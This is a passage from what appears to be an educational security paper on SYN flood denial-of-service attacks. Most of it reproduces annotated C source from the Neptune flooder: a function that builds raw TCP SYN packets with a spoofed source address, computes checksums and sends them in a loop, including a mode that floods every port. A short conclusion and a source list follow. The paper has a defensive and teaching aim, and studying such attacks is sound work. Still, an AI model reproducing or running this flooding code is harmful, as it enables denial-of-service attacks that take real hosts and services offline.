<ul><ul><ul><ul><ul><ul><ul><p><font size="3" face="Arial">- Steve&nbsp;</font>&nbsp;<br />
</p></ul></ul></ul></ul></ul></ul></ul>
<p><font size="3" face="Courier New">fprintf(stderr,&quot;\nSetting 
alarm timeout for 10 seconds...\n&quot;);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">alarm(10);&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">while(1){&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">read(sock,(struct ippkt *)&amp;pkt,MAXPAK-1);</font></p>
<p><font size="3" face="Courier New">&nbsp; &nbsp;&nbsp;if(pkt.icmp.type==ICMP_ECHOREPLY&amp;&amp;icmp-&gt;un.echo.id==pakID){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(!HANDLERCODE)return(0);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">return(1);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">}</font></p>
<p><font size="3" face="Courier New">&nbsp; &nbsp;}&nbsp;</font></p>
<p><font size="3" face="Courier New">}</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Next 
is the piece of code that initiates the flood of outgoing <B style="color:black;background-color:#A0FFFF">SYN</B> packets. 
It is the part responsible for building the TCP packets with the <B style="color:black;background-color:#A0FFFF">SYN</B> 
flag set and the <B style="color:black;background-color:#ff9999">source</B> address spoofed:</font>&nbsp;<br />&nbsp;<br />
</p>
<p><font size="3" face="Courier New">void flood(int sock,unsigned sadd,unsigned 
dadd,u_short dport,int amount){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">unsigned 
short in_cksum(unsigned short *,int);&nbsp; </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;struct packet{</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;struct iphdr ip;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;struct tcphdr tcp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;}packet;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">struct 
pseudo_header{&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;unsigned 
int source_address;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;unsigned int dest_address;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;unsigned char placeholder;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;unsigned char protocol;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;unsigned short tcp_length;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;struct tcphdr tcp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;}pseudo_header;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;struct sockaddr_in 
sin;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;register int i=0,j=0;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">int 
tsunami=0;&nbsp;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">unsigned 
short sport=161+getpid();</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">if(!dport){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">tsunami++;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">fprintf(stderr,&quot;\nTSUNAMI!\n&quot;);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">fprintf(stderr,&quot;\nflooding port:&quot;);&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">}</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;sin.sin_family=AF_INET;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;sin.sin_port=sport;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;sin.sin_addr.s_addr=dadd;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.<B style="color:black;background-color:#ff9999">source</B>=sport;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.dest=htons(dport); 
&nbsp;&nbsp;packet.tcp.seq=49358353+getpid();&nbsp;&nbsp;packet.tcp.ack_seq=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.doff=5;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">packet.tcp.res1=0;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">packet.tcp.res2=0;&nbsp;&nbsp;</font><font
 size="3" face="Arial">**This setting had to be removed on my Linux</font></p>
<ul><ul><ul><ul><ul><ul><p><font size="3" face="Arial">host as it appears 
to be no longer supported in the tcp.h file - Steve&nbsp;</font></p></ul></ul></ul></ul></ul></ul>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.urg=0;&nbsp;&nbsp;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.ack=0;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">packet.tcp.psh=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.rst=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.<B style="color:black;background-color:#A0FFFF">syn</B>=1;&nbsp;&nbsp;</font><font
 size="3" face="Arial">**Here is where we set the <B style="color:black;background-color:#A0FFFF">SYN</B> flag - Steve</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.fin=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.window=htons(242); </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.check=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.tcp.urg_ptr=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font size="3" face="Arial">**Now 
we build the IP header which includes</font></p>
<ul><ul><ul><ul><ul><ul><p><font size="3" face="Arial">our target address 
and spoofed <B style="color:black;background-color:#ff9999">source</B> address - Steve</font></p></ul></ul></ul></ul></ul></ul>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.version=4;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">packet.ip.ihl=5;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.tos=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.tot_len=htons(40);&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.id=getpid();&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">packet.ip.frag_off=0;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.ttl=255;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.protocol=IPPROTO_TCP; </font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.check=0;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">packet.ip.saddr=sadd;&nbsp;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;packet.ip.daddr=dadd;&nbsp;&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">pseudo_header.source_address=packet.ip.saddr;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;pseudo_header.dest_address=packet.ip.daddr;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;pseudo_header.placeholder=0;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;pseudo_header.protocol=IPPROTO_TCP;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;pseudo_header.tcp_length=htons(20);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">while(1){&nbsp;&nbsp;&nbsp;/* 
Main loop */</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(tsunami){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(j==MAXPORT){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">tsunami=0;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">&nbsp; 
&nbsp;&nbsp;&nbsp;break;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">}</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">packet.tcp.dest=htons(++j);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">fprintf(stderr,&quot;%d&quot;,j);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">fprintf(stderr,&quot;%c&quot;,0x08);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(j&gt;=10)fprintf(stderr,&quot;%c&quot;,0x08);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(j&gt;=100)fprintf(stderr,&quot;%c&quot;,0x08);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(j&gt;=1000)fprintf(stderr,&quot;%c&quot;,0x08);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(j&gt;=10000)fprintf(stderr,&quot;%c&quot;,0x08);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">}</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;&nbsp;for(i=0;i&lt;amount;i++){</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">packet.tcp.source++;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;packet.tcp.seq++;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;packet.tcp.check=0;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;packet.ip.id++;&nbsp;</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;packet.ip.check=0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">packet.ip.check=in_cksum((unsigned short 
*)&amp;packet.ip,20);</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;bcopy((char *)&amp;packet.tcp,(char *)&amp;pseudo_header.tcp,20);</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
&nbsp;&nbsp;&nbsp;packet.tcp.check=in_cksum((unsigned short *)&amp;pseudo_header,32);</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">usleep(FLOODSLEEP);&nbsp; </font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">sendto(sock,&amp;packet,40,0,(struct sockaddr 
*)&amp;sin,sizeof(sin));</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(!tsunami&amp;&amp;!KEEPQUIET)fprintf(stderr,&quot;.&quot;);</font></p>
<p><font size="3" face="Courier New">&nbsp;&nbsp; &nbsp;&nbsp;}&nbsp;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font
 size="3" face="Courier New">if(!tsunami)break;</font></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Courier New">}</font></p>
<p><font size="3" face="Courier New">}</font></p>
<h1><font size="3" face="Arial">Conclusion</font></h1>
&nbsp;<br />
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">Denial 
of Service attacks are becoming more prevalent everyday. According to 
a recent study performed by the University of California, San Diego, 
4000 Denial of Service attacks occur every week. (</font><a href="http://www.cnn.com/2001/TECH/internet/05/24/dos.study.idg/"><font
 color="#0000FF" size="3" face="Arial">http://www.cnn.com/2001/TECH/internet/05/24/dos.study.idg/</font></a><font
 size="3" face="Arial">)</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">The 
ease of performing these attacks and the difficulties involved in trying 
to prevent them are major concerns for the Internet community. As is 
often mentioned by the security industry, there is no silver bullet. 
Defense in depth, or the use of multiple layers of security, is your 
best protection.</font>&nbsp;<br /></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="3" face="Arial">If 
you are responsible for managing and protecting publicly accessible 
network hosts, it is crucial that you are familiar with the options 
available to you. Access to trade publications and education are critical. 
Management backing and funding are also necessary to provide an acceptable 
level of system availibility. Lastly, quick application of vendor supplied 
patches is a must.</font>&nbsp;<br />&nbsp;<br /></p>
<p><font size="3" face="Arial">Sources</font>&nbsp;<br /></p>
<p><font size="3" face="Arial">Information Sciences Institute, University 
of Southern California. RFC: 793 TRANSMISSION CONTROL PROTOCOL DARPA 
INTERNET PROGRAM PROTOCOL SPECIFICATION, September 1981. </font><a href="http://www.faqs.org/rfcs/rfc793.html"><font
 color="#0000FF" size="3" face="Arial">http://www.faqs.org/rfcs/rfc793.html</font></a></p>
<p><font size="3" face="Arial"> </font></p>
<p><font size="3" face="Arial">Cisco Systems, Inc.&nbsp; Internet Protocols 
(IP), June 17, 1999. </font><a href="http://www.cisco.com/univercd/cc/td/doc/cisintwk/ito_doc/ip.htm#xtocid2236316"><font
 color="#0000FF" size="3" face="Arial">http://www.cisco.com/univercd/cc/td/doc/cisintwk/ito_doc/ip.htm#xtocid2236316</font></a>&nbsp;<br />
</p>
<p><font size="3" face="Arial">Ferguson, P. and Senie, D. Network Ingress 
Filtering: Defeating Denial of Service Attacks which employ IP <B style="color:black;background-color:#ff9999">Source</B> 
Address Spoofing, January 1998 </font><a href="http://www.faqs.org/rfcs/rfc2267.html"><font
 color="#0000FF" size="3" face="Arial">http://www.faqs.org/rfcs/rfc2267.html</font></a>&nbsp;<br />
</p>
<p><font size="3" face="Arial">Scambray, Joel, McClure, Stewart and 
Kurtz, George. Hacking Exposed Second Edition: Network Security Secrets 
&amp; Solutions. Berkeley: Osborne/McGraw Hill, 2001.</font>&nbsp;<br />
</p>
<p><font size="3" face="Arial">National Infrastructure Protection Center. 
Overview of Sans and DDoS Attacks.</font></p>
<p><a href="http://www.nipc.gov/ddos.pdf"><font color="#0000FF" size="3" face="Arial">http://www.nipc.gov/ddos.pdf</font></a>&nbsp;<br />
</p>
<p><font size="3" face="Arial">daemon9, route and infinity. Project 
<B style="color:black;background-color:#99ff99">Neptune</B>. Phrack Magazine. Volume Seven, Issue Forty-Eight (July 1996): 
File 13 of 18. </font><a href="http://www.fc.net/phrack/files/p48/p48-13.html"><font
 color="#0000FF" size="3" face="Arial">http://www.fc.net/phrack/files/p48/p48-13.html</font></a>&nbsp;<br />
</p>
<p><font size="3" face="Arial">Costello, Sam. Study: Nearly 4,000 DoS 
attacks occur per week. May 24, 2001.</font></p>
<p><a href="http://www.cnn.com/2001/TECH/internet/05/24/dos.study.idg/"><font
 color="#0000FF" size="3" face="Arial">http://www.cnn.com/2001/TECH/internet/05/24/dos.study.idg/</font></a>&nbsp;<br />
&nbsp;<br /></p>


</body>
</html>
